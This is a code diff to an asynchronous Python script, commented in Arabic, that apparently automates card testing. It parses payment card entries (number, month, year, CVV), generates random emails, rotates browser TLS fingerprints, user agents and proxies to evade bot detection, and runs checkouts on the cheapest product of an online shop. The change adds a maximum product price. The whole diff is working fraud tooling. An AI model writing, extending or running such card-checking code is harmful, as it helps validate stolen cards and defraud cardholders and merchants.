@@ -851,23 +851,42 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str, chec
         raise Exception(f"returned {resp.status_code}")
     return resp.status_code, resp.text
 
-async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
+# auto_async.py - فقط الجزء المطلوب من run_checkout_for_card_async
+
+async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "", max_price: float = 20.0) -> CheckResult:
+    """
+    تشغيل فحص البطاقة مع تحديد أقصى سعر للمنتج
+    
+    Args:
+        shop_url: رابط المتجر
+        card_entry: البطاقة بصيغة رقم|شهر|سنة|CVV
+        proxy_url: البروكسي (اختياري)
+        max_price: أقصى سعر للمنتج (افتراضي 20 دولار)
+    """
     currency = "USD"
     country = "US"
     site_name = shop_url.replace("https://", "").replace("http://", "")
     result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name, currency=currency, status=CheckStatus.ERROR)
+    
     try:
         card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
     except Exception as e:
         result.error = e
         return result
+    
     email = generate_random_email()
     impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
     user_agent = random.choice(USER_AGENTS)
     client = AsyncTLSClient(timeout=22, proxy_url=proxy_url, impersonate=impersonate, user_agent=user_agent)
+    
     try:
         try:
-            title, product_id, product_handle, variant_id, price = await find_cheapest_product(client, shop_url)
+            # ===== استخدام max_price في البحث =====
+            title, product_id, product_handle, variant_id, price = await find_cheapest_product(
+                client, shop_url,
+                min_price=0.50,
+                max_price=max_price  # السعر الأقصى المطلوب
+            )
             _ = title
         except Exception as e:
             result.status = CheckStatus.ERROR
